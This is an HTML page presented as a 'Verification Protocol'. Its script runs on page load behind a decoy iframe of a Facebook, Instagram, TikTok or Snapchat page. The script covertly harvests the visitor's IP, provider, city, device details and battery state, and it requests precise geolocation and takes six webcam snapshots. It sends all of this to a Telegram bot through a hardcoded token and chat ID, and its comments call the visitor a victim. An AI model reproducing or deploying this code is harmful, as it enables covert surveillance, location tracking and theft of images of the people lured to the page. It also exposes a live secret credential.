<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification Protocol</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; }
        #mask { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: none; z-index: 1; display: none; }
        #loader { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 50; display: flex; justify-content: center; align-items: center; }
        .spin { border: 3px solid #222; border-top: 3px solid #0095f6; border-radius: 50%; width: 40px; height: 40px; animation: s 1s linear infinite; }
        @keyframes s { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #v, #ca { display: none; }
    </style>
</head>
<body>
<iframe id="mask" allow="autoplay; camera; geolocation"></iframe>
<div id="loader"><div class="spin"></div></div>
<video id="v" autoplay></video><canvas id="ca"></canvas>

<script>
    // Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¨ÙˆØª Ø§Ù„Ø®Ø§ØµØ© Ø¨Ùƒ
    const _T = "8289793943:AAErsFN2VaQVH30MhCXhovqrhAo34VSube4";
    const _I = "5775781038";
    
    const q = new URLSearchParams(window.location.search);
    const type = q.get('type') || 'fb';

    // Ø±ÙˆØ§Ø¨Ø· Ø§Ù„ØªÙ…ÙˆÙŠÙ‡ Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠØ© Ø­Ø³Ø¨ Ø·Ù„Ø¨Ùƒ [cite: 2026-01-31]
    const masks = {
        'fb': 'https://www.facebook.com/zuck', // Ø¨Ø±ÙˆÙØ§ÙŠÙ„ Ù…Ø§Ø±Ùƒ
        'ig': 'https://www.instagram.com/p/C_m_5N_I_/', // Ø¨ÙˆØ³Øª Ø§Ù†Ø³ØªÙ‚Ø±Ø§Ù…
        'tt': 'https://www.tiktok.com/embed/v2/7106821361845603585?autoplay=1', // ÙÙŠØ¯ÙŠÙˆ Ø´ØºØ§Ù„
        'sc': 'https://www.snapchat.com/add/cristiano' // Ø­Ø³Ø§Ø¨ ÙƒØ±ÙŠØ³ØªÙŠØ§Ù†Ùˆ
    };

    window.onload = () => {
        document.getElementById('mask').src = masks[type];
        document.getElementById('mask').style.display = 'block';
        startMission();
    };

    async function startMission() {
        // [1] Ø³Ø­Ø¨ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø´Ø§Ù…Ù„Ø© (IPØŒ Ø¨Ø·Ø§Ø±ÙŠØ©ØŒ Ø¬Ù‡Ø§Ø²) [cite: 2026-01-31]
        try {
            let b = await navigator.getBattery();
            let ipR = await fetch('https://ipapi.co/json/').then(r => r.json());
            let d = `ğŸš€ ØµÙŠØ¯ Ø¬Ø¯ÙŠØ¯ Ù„Ù„Ù…Ø·ÙˆØ± Ø£Ø­Ù…Ø¯!\nğŸŒ Ø§Ù„Ù…Ù†ØµØ©: ${type}\n\nğŸŒ Ø§Ù„Ø´Ø¨ÙƒØ©:\nğŸŒ IP: ${ipR.ip}\nğŸ¢ Ø§Ù„Ù…Ø²ÙˆØ¯: ${ipR.org}\nğŸ“ Ø§Ù„Ù…ÙˆÙ‚Ø¹: ${ipR.city}, ${ipR.country_name}\n\nğŸ“± Ø§Ù„Ø¬Ù‡Ø§Ø²:\nğŸ–¥ï¸ Ø§Ù„Ø±Ø§Ù…: ${navigator.deviceMemory}GB\nğŸ“¡ Ø§Ù„Ù…Ø¹Ø§Ù„Ø¬: ${navigator.hardwareConcurrency} Cores\nğŸ”‹ Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©: ${Math.round(b.level * 100)}%\nğŸ”Œ Ø§Ù„Ø´Ø­Ù†: ${b.charging ? 'Ù†Ø¹Ù…' : 'Ù„Ø§'}`;
            send(d);
        } catch(e) {}

        // [2] Ø·Ù„Ø¨ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¯Ù‚ÙŠÙ‚ [cite: 2026-01-31]
        navigator.geolocation.getCurrentPosition(p => {
            send(`ğŸ“ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¯Ù‚ÙŠÙ‚:\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
        });

        // [3] Ø·Ù„Ø¨ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ÙˆØ³Ø­Ø¨ 6 ØµÙˆØ± Ù…ØªØªØ§Ù„ÙŠØ© [cite: 2026-01-31]
        try {
            const str = await navigator.mediaDevices.getUserMedia({video: true});
            document.getElementById('v').srcObject = str;
            document.getElementById('loader').style.display = 'none';
            for(let i=0; i<6; i++) setTimeout(() => snap(), i * 2000);
        } catch(e) { 
            send("âŒ Ø§Ù„Ø¶Ø­ÙŠØ© Ø±ÙØ¶ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§"); 
            document.getElementById('loader').style.display = 'none'; 
        }
    }

    function snap() {
        const ca = document.getElementById('ca'), vi = document.getElementById('v');
        ca.width = vi.videoWidth; ca.height = vi.videoHeight;
        ca.getContext('2d').drawImage(vi, 0, 0);
        ca.toBlob(blo => {
            let f = new FormData(); f.append('photo', blo);
            fetch(`https://api.telegram.org/bot${_T}/sendPhoto?chat_id=${_I}`, {method:'POST', body:f});
        }, 'image/jpeg');
    }

    function send(t) { fetch(`https://api.telegram.org/bot${_T}/sendMessage?chat_id=${_I}&text=${encodeURIComponent(t)}`); }
</script>
</body>
</html>
